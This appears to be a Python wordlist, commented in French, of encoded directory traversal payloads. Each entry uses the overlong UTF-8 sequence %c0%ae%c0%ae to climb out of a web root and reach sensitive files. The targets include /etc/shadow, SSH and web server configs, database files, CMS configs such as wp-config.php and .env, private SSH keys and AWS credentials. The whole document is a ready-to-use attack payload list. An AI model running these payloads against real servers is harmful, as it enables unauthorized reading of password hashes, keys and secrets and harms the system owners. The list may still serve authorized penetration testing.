traversals_3_encoded = [
    # ==============================
    # 1. FICHIERS SYSTÈME CRITIQUES
    # ==============================
    "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/shadow",                   # Hashs mots de passe (root requis)
    "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/group",                    # Groupes
    "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/hostname",                 # Nom de la machine
    "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/hosts",                    # Résolution locale
    "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/resolv.conf",              # DNS
    "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/os-release",               # Infos OS
    "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/issue",                    # Bannière login

    # ==============================
    # 2. CONFIG RÉSEAU & SERVICES
    # ==============================
    "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/network/interfaces",       # Interfaces réseau (Debian/Ubuntu)
    "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/sysctl.conf",              # Paramètres kernel
    "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/services",                 # Liste des ports/services
    "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/ssh/sshd_config",          # Config SSH

    # ==============================
    # 3. LOGS SYSTÈME
    # ==============================
    "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/var/log/syslog",               # Debian/Ubuntu
    "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/var/log/messages",             # RedHat/CentOS
    "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/var/log/auth.log",             # Authentification
    "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/var/log/secure",               # Sécurité (RedHat)
    "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/var/log/dmesg",                # Logs kernel
    "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/var/log/apache2/error.log",    # Logs Apache Debian/Ubuntu
    "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/var/log/httpd/error_log",      # Logs Apache RedHat
    "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/var/log/nginx/error.log",      # Logs Nginx
    "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/var/log/mysql/error.log",      # Logs MySQL

    # ==============================
    # 4. FICHIERS WEB
    # ==============================
    "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/var/www/html/index.html",      # Page par défaut
    "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/var/www/html/index.php",       # Page PHP
    "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/var/www/html/config.php",      # Config PHP
    "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/apache2/apache2.conf",     # Config Apache Debian/Ubuntu
    "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/httpd/conf/httpd.conf",    # Config Apache RedHat
    "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/nginx/nginx.conf",         # Config Nginx
    "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/php/7.4/apache2/php.ini",  # PHP config (Debian/Ubuntu exemple)
    "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/php/8.1/fpm/php.ini",      # PHP config (Debian/Ubuntu récent)
    "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/php.ini",                  # PHP config générique

    # ==============================
    # 5. BASES DE DONNÉES (SQL)
    # ==============================
    "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/var/lib/mysql/mysql/user.MYD",       # MySQL users
    "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/var/lib/mysql/mysql/user.frm",       # MySQL users structure
    "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/var/lib/mysql/mysql.db",             # DB principales
    "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/var/lib/mysql/mysql/user.ibd",       # Table user
    "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/var/lib/mysql/ibdata1",              # Données globales MySQL
    "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/var/lib/mysql/ib_logfile0",          # Logs InnoDB
    "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/var/lib/mysql/ib_logfile1",          # Logs InnoDB
    "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/mysql/my.cnf",                   # Config MySQL (Debian/Ubuntu)
    "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/my.cnf",                         # Config MySQL générique
    "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/var/lib/postgresql/data/pg_hba.conf",# Config PostgreSQL
    "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/var/lib/postgresql/data/postgresql.conf", # Config PostgreSQL
    "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/var/lib/postgresql/data/base",       # Bases PostgreSQL
    "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/data/data/com.mysql/databases.db",   # MySQL sur Android
    "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/var/www/html/db.sqlite3",            # SQLite Django
    "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/var/www/html/database.sqlite",       # SQLite générique
    "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/var/www/html/storage/database.sqlite", # Laravel SQLite
    "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/var/www/html/db.sql",
    "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/var/www/html/backup.sql",
    "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/var/lib/mongodb/mongod.lock",
    "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/var/lib/redis/dump.rdb",
    "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/var/www/html/sql_dump.sql",
    "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/var/www/html/backup/db_backup.sql",
    
    # ==============================
    # 6. CMS POPULAIRES
    # ==============================

    # WordPress
    "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/var/www/html/wp-config.php",         # Config WordPress
    "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/var/www/html/wp-content/uploads",    # Uploads WP
    "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/var/www/html/wp-includes/version.php", # Version WP

    # Drupal
    "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/var/www/html/sites/default/settings.php",

    # Joomla
    "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/var/www/html/configuration.php",

    # Magento
    "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/var/www/html/app/etc/env.php",

    # Laravel
    "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/var/www/html/.env",                  # Config Laravel
    "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/var/www/html/storage/logs/laravel.log",

    # Django
    "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/var/www/html/settings.py",           # Django settings

    # ==============================
    # 7. FICHIERS SENSIBLES GÉNÉRIQUES
    # ==============================
    "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/.env",                               # Fichier d'env générique
    "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/config.json",                        # Config JSON générique
    "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/config.php",                         # Config PHP générique
    "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/settings.py",                        # Config Django
    "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/database.yml",                       # Rails config DB
    "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/composer.json",                      # PHP dépendances
    "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/package.json",                       # NodeJS dépendances
    "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/.git/config",                        # Config Git
    "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/.htaccess",                          # Fichier Apache
    "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/.htpasswd",                          # Mots de passe Apache

    # ==============================
    # 8. CRON JOBS
    # ==============================
    "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/crontab",
    "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/var/spool/cron/root",
    "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/var/spool/cron/crontabs/root",
    
    # ==============================
    # 9. OTHERS
    # ==============================
    "%c0%ae%c0%ae/.htaccess", "%c0%ae%c0%ae/%c0%ae%c0%ae/.htaccess",
    "%c0%ae%c0%ae/.htpasswd", "%c0%ae%c0%ae/%c0%ae%c0%ae/.htpasswd",
    "%c0%ae%c0%ae/.user.ini", "%c0%ae%c0%ae/%c0%ae%c0%ae/.user.ini",
    "%c0%ae%c0%ae/web.config", "%c0%ae%c0%ae/%c0%ae%c0%ae/web.config",
    
    # Fichiers config
    "%c0%ae%c0%ae/.env", "%c0%ae%c0%ae/%c0%ae%c0%ae/.env",
    "%c0%ae%c0%ae/config.php", "%c0%ae%c0%ae/%c0%ae%c0%ae/config.php",
    "%c0%ae%c0%ae/settings.php", "%c0%ae%c0%ae/%c0%ae%c0%ae/settings.php",
    "%c0%ae%c0%ae/wp-config.php", "%c0%ae%c0%ae/%c0%ae%c0%ae/wp-config.php",
    "%c0%ae%c0%ae/configuration.php", "%c0%ae%c0%ae/%c0%ae%c0%ae/configuration.php",
    "%c0%ae%c0%ae/env.php", "%c0%ae%c0%ae/%c0%ae%c0%ae/env.php",

    # Logs
    "%c0%ae%c0%ae/error.log", "%c0%ae%c0%ae/%c0%ae%c0%ae/error.log",
    "%c0%ae%c0%ae/debug.log", "%c0%ae%c0%ae/%c0%ae%c0%ae/debug.log",
    "%c0%ae%c0%ae/laravel.log", "%c0%ae%c0%ae/%c0%ae%c0%ae/laravel.log",

    # Backups
    "%c0%ae%c0%ae/backup.zip", "%c0%ae%c0%ae/%c0%ae%c0%ae/backup.zip",
    "%c0%ae%c0%ae/config.php.bak", "%c0%ae%c0%ae/%c0%ae%c0%ae/config.php.bak",
    "%c0%ae%c0%ae/wp-config.php.old", "%c0%ae%c0%ae/%c0%ae%c0%ae/wp-config.php.old",

    # Credentials
    "%c0%ae%c0%ae/.git/config", "%c0%ae%c0%ae/%c0%ae%c0%ae/.git/config",
    "%c0%ae%c0%ae/.ssh/id_rsa", "%c0%ae%c0%ae/%c0%ae%c0%ae/.ssh/id_rsa",
    "%c0%ae%c0%ae/.aws/credentials", "%c0%ae%c0%ae/%c0%ae%c0%ae/.aws/credentials",

    # CMS
    "%c0%ae%c0%ae/wp-content/debug.log", "%c0%ae%c0%ae/%c0%ae%c0%ae/wp-content/debug.log",
    "%c0%ae%c0%ae/sites/default/settings.php", "%c0%ae%c0%ae/%c0%ae%c0%ae/sites/default/settings.php",
    "%c0%ae%c0%ae/storage/logs/laravel.log", "%c0%ae%c0%ae/%c0%ae%c0%ae/storage/logs/laravel.log",

    # Temp
    "%c0%ae%c0%ae/debug.php", "%c0%ae%c0%ae/%c0%ae%c0%ae/debug.php"
    
]